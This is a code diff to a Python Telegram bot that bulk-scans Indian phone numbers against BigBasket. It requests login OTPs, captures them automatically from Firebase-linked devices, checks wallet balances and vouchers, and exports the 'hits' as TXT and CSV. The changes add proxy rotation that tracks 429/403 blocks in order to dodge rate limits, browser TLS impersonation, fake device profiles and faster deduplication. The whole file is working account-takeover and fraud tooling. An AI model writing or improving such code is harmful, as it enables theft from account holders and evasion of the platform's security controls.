@@ -29,6 +29,8 @@ import collections
 import urllib.parse
 import http.server
 import socketserver
+import sqlite3
+import signal
 from datetime import datetime
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from typing import Dict, Any, Optional, List, Tuple, Set, Callable
@@ -92,55 +94,91 @@ BB_ADDRESS_URL = f"{BB_API}/member-tdl/v3/member/address/"
 BB_VOUCHERS_URL = f"{BB_API}/wallet/v1/vouchers"
 
 PROXIES_FILE = os.path.join(CONFIG_DIR, "proxies.txt")
-DEDUP_CACHE_FILE = os.path.join(CONFIG_DIR, "processed_numbers_cache.json")
+DB_PATH = os.path.join(CONFIG_DIR, "bot_cache.db")
+db_lock = threading.RLock()
+proxy_health_lock = threading.RLock()
+PROXY_FAILURES: Dict[str, int] = collections.defaultdict(int)
+PROXY_SUCCESSES: Dict[str, int] = collections.defaultdict(int)
+
+def init_db():
+    """Initializes high-concurrency SQLite database with Write-Ahead Logging (WAL) for sub-millisecond deduplication."""
+    try:
+        with db_lock:
+            with sqlite3.connect(DB_PATH) as conn:
+                conn.execute("PRAGMA journal_mode=WAL;")
+                conn.execute("""
+                    CREATE TABLE IF NOT EXISTS processed_numbers (
+                        phone TEXT PRIMARY KEY,
+                        checked_at INTEGER NOT NULL
+                    )
+                """)
+                conn.execute("CREATE INDEX IF NOT EXISTS idx_checked_at ON processed_numbers(checked_at);")
+                conn.commit()
+    except Exception as e:
+        print(f"DB init warning: {e}")
+
+init_db()
+
+def record_proxy_result(proxy_url: Optional[str], success: bool):
+    """Tracks proxy reliability and penalizes failing IPs to optimize routing speed."""
+    if not proxy_url:
+        return
+    with proxy_health_lock:
+        if success:
+            PROXY_SUCCESSES[proxy_url] += 1
+            if PROXY_FAILURES[proxy_url] > 0:
+                PROXY_FAILURES[proxy_url] -= 1
+        else:
+            PROXY_FAILURES[proxy_url] += 1
 
 def get_rotating_proxy() -> Optional[dict]:
-    """Returns a random proxy dict if configured in env or config/proxies.txt (Pure HTTP, 0 Browser)."""
+    """Smart health-aware proxy selection with dynamic auto-failover (Pure HTTP, 0 Browser)."""
     env_p = os.environ.get("PROXIES") or os.environ.get("PROXY_URL")
+    candidates = []
     if env_p:
-        p_list = [x.strip() for x in env_p.split(",") if x.strip()]
-        if p_list:
-            chosen = random.choice(p_list)
-            return {"http": chosen, "https": chosen}
+        candidates.extend([x.strip() for x in env_p.split(",") if x.strip()])
     if os.path.exists(PROXIES_FILE):
         try:
             with open(PROXIES_FILE, "r") as f:
-                lines = [l.strip() for l in f if l.strip() and not l.startswith("#")]
-                if lines:
-                    chosen = random.choice(lines)
-                    if not chosen.startswith("http"):
-                        chosen = f"http://{chosen}"
-                    return {"http": chosen, "https": chosen}
+                for line in f:
+                    cl = line.strip()
+                    if cl and not cl.startswith("#"):
+                        if not cl.startswith("http"):
+                            cl = f"http://{cl}"
+                        candidates.append(cl)
         except Exception:
             pass
-    return None
+    if not candidates:
+        return None
+
+    with proxy_health_lock:
+        # Prioritize healthy proxies with fewer than 5 consecutive errors
+        healthy = [p for p in candidates if PROXY_FAILURES[p] < 5]
+        chosen = random.choice(healthy if healthy else candidates)
+        return {"http": chosen, "https": chosen}
 
 def is_recently_processed(phone: str, hours: int = 24) -> bool:
-    """Checks if a phone number was already checked within the last N hours."""
-    if not os.path.exists(DEDUP_CACHE_FILE):
-        return False
+    """Checks if a phone number was already checked within the last N hours via fast indexed SQLite WAL query."""
     try:
-        with open(DEDUP_CACHE_FILE, "r") as f:
-            data = json.load(f)
-            ts = data.get(phone)
-            if ts and (time.time() - ts) < (hours * 3600):
-                return True
+        cutoff = int(time.time()) - (hours * 3600)
+        with db_lock:
+            with sqlite3.connect(DB_PATH, timeout=5) as conn:
+                cur = conn.cursor()
+                cur.execute("SELECT 1 FROM processed_numbers WHERE phone = ? AND checked_at >= ?", (phone, cutoff))
+                return cur.fetchone() is not None
     except Exception:
-        pass
-    return False
+        return False
 
 def mark_phone_processed(phone: str):
-    """Records phone check timestamp in persistent cache."""
+    """Records phone check timestamp in SQLite WAL cache with automatic 48h pruning."""
     try:
-        cache = {}
-        if os.path.exists(DEDUP_CACHE_FILE):
-            with open(DEDUP_CACHE_FILE, "r") as f:
-                cache = json.load(f)
-        cache[phone] = int(time.time())
-        cutoff = time.time() - (48 * 3600)
-        cache = {k: v for k, v in cache.items() if v > cutoff}
-        with open(DEDUP_CACHE_FILE, "w") as f:
-            json.dump(cache, f)
+        now = int(time.time())
+        with db_lock:
+            with sqlite3.connect(DB_PATH, timeout=5) as conn:
+                conn.execute("INSERT OR REPLACE INTO processed_numbers (phone, checked_at) VALUES (?, ?)", (phone, now))
+                cutoff = now - (48 * 3600)
+                conn.execute("DELETE FROM processed_numbers WHERE checked_at < ?", (cutoff,))
+                conn.commit()
     except Exception:
         pass
 
@@ -374,6 +412,22 @@ def clear_scan_state(chat_id: int):
 class RenderHealthHandler(http.server.BaseHTTPRequestHandler):
     def do_GET(self):
         parsed = urllib.parse.urlparse(self.path)
+        if parsed.path in ("/healthz", "/metrics"):
+            self.send_response(200)
+            self.send_header("Content-type", "application/json")
+            self.end_headers()
+            resp = {
+                "status": "healthy",
+                "uptime_sec": int(time.time() - BOT_START_TIME),
+                "active_workers": MAX_SCAN_WORKERS,
+                "active_scans": len(active_scans),
+                "db_engine": "SQLite WAL Mode",
+                "official_channel": "@OwAbyss",
+                "timestamp": datetime.now().strftime("%d-%m-%Y %H:%M:%S")
+            }
+            self.wfile.write(json.dumps(resp, indent=2).encode("utf-8"))
+            return
+
         if parsed.path == "/logs":
             self.send_response(200)
             self.send_header("Content-type", "text/plain; charset=utf-8")
@@ -521,12 +575,15 @@ def broadcast_hit_to_channels(hit_card: str, chat_id: int):
 class BigBasketClient:
     def __init__(self, proxy: Optional[dict] = None):
         self.s = cffi_requests.Session(impersonate="chrome120")
+        self.proxy_url = None
         if proxy:
             self.s.proxies = proxy
+            self.proxy_url = proxy.get("http")
         else:
             p = get_rotating_proxy()
             if p:
                 self.s.proxies = p
+                self.proxy_url = p.get("http")
         profiles = [
             {"make": "Samsung", "model": "SM-A536E", "os": "13"},
             {"make": "Google", "model": "Pixel 7", "os": "14"},
@@ -627,7 +684,10 @@ class BigBasketClient:
                 return False, f"Invalid response ({r.status_code})"
 
             if r.status_code == 200 and d.get("message") == "OTP sent successfully":
+                record_proxy_result(self.proxy_url, True)
                 return True, d.get("refId", "")
+            if r.status_code in (429, 403):
+                record_proxy_result(self.proxy_url, False)
             err_msg = ""
             if "errors" in d and isinstance(d["errors"], list) and len(d["errors"]) > 0:
                 err_msg = d["errors"][0].get("display_msg") or d["errors"][0].get("msg", "")
@@ -1537,6 +1597,7 @@ def run_bulk_scan(chat_id: int, targets: List[Dict[str, Any]], scan_title: str =
     prog_msg = safe_send(chat_id, start_msg_text, reply_markup=markup)
     prog_id = prog_msg.message_id if prog_msg else None
     last_edit_time = [0.0]
+    scan_start_time = time.time()
     update_lock = threading.RLock()
 
     def update_progress_ui(cur_phone: str, cur_dev: str, cur_slot: str):
@@ -1556,13 +1617,21 @@ def run_bulk_scan(chat_id: int, targets: List[Dict[str, Any]], scan_title: str =
             h_count = len(state["hits"])
             zb_count = len(state["zero_bal"])
 
+            elapsed_sec = max(now_ts - scan_start_time, 1.0)
+            req_speed = p_count / elapsed_sec
+            rem_targets = max(total - p_count, 0)
+            eta_sec = int(rem_targets / req_speed) if req_speed > 0.08 else 0
+            eta_str = f"{eta_sec // 60:02d}m {eta_sec % 60:02d}s" if eta_sec > 0 else "Calculating..."
+            speed_str = f"{req_speed:.1f} req/s"
+
             status_text = (
-                f"🔄 <b>BigBasket Multi-Threaded Scan Running...</b>\n\n"
+                f"🔄 <b>BigBasket High-Speed Multi-Threaded Engine</b>\n\n"
                 f"📊 <b>Progress:</b> <code>[{bar}] {pct}%</code> ({p_count}/{total})\n"
-                f"📱 <b>Latest Active:</b> <code>+91 {esc(cur_phone)}</code>\n"
-                f"📟 <b>Device:</b> <code>{esc(cur_dev)}</code> ({esc(cur_slot)})\n"
+                f"⚡ <b>Speed:</b> <code>{speed_str}</code> | ⏳ <b>ETA:</b> <code>{eta_str}</code>\n"
+                f"📱 <b>Active SIM:</b> <code>+91 {esc(cur_phone)}</code> ({esc(cur_slot)})\n"
+                f"📟 <b>Device:</b> <code>{esc(cur_dev)}</code>\n"
                 f"🔥 <b>Hits Found:</b> <b>{h_count}</b> | ℹ️ <b>Zero Bal:</b> <b>{zb_count}</b>\n"
-                f"🏎️ <b>Workers:</b> <code>{MAX_SCAN_WORKERS} Parallel Threads</code>\n\n"
+                f"🏎️ <b>Workers:</b> <code>{MAX_SCAN_WORKERS} Parallel Threads (SQLite WAL)</code>\n\n"
                 f"⏳ <i>Auto-capturing OTPs from Firebase & checking wallets...</i>"
             )
             safe_edit(chat_id, prog_id, status_text, reply_markup=markup)
@@ -1844,9 +1913,13 @@ def run_bulk_scan(chat_id: int, targets: List[Dict[str, Any]], scan_title: str =
         f"👤 <b>Unregistered on BB:</b> <code>{len(no_account)}</code>\n"
         f"📵 <b>Offline Devices:</b> <code>{len(offline)}</code>\n"
         f"⏳ <b>OTP Timeout:</b> <code>{len(timeout)}</code>\n\n"
-        f"📥 <i>Aapki hits .txt file direct niche DM me bhej di gayi hai:</i>"
+        f"📥 <i>Aapki hits report (.txt aur Excel .csv) niche direct DM me bhej di gayi hai:</i>"
     )
-    safe_send(chat_id, summary_text)
+    fin_markup = types.InlineKeyboardMarkup()
+    if hits:
+        fin_markup.add(types.InlineKeyboardButton(f"👀 Browse {len(hits)} Hits Interactively (Page-by-Page)", callback_data="browse_hits_0"))
+    fin_markup.add(types.InlineKeyboardButton("🔙 Scanner Hub", callback_data="menu_scanner"))
+    safe_send(chat_id, summary_text, reply_markup=fin_markup)
 
     # Generate Excel-compatible CSV report
     csv_file_path = os.path.join(RESULTS_DIR, f"BB_HITS_{chat_id}_{ts_str}.csv")
@@ -2293,6 +2366,7 @@ def show_export_menu(chat_id: int, message_id: Optional[int] = None):
 
     markup = types.InlineKeyboardMarkup()
     if files:
+        markup.add(types.InlineKeyboardButton("👀 Browse Hits Interactively", callback_data="browse_hits_0"))
         markup.add(types.InlineKeyboardButton("📥 Download Latest Reports (TXT + CSV)", callback_data="export_latest_hits"))
     markup.add(types.InlineKeyboardButton("🔙 Back to Main Menu", callback_data="start_menu"))
 
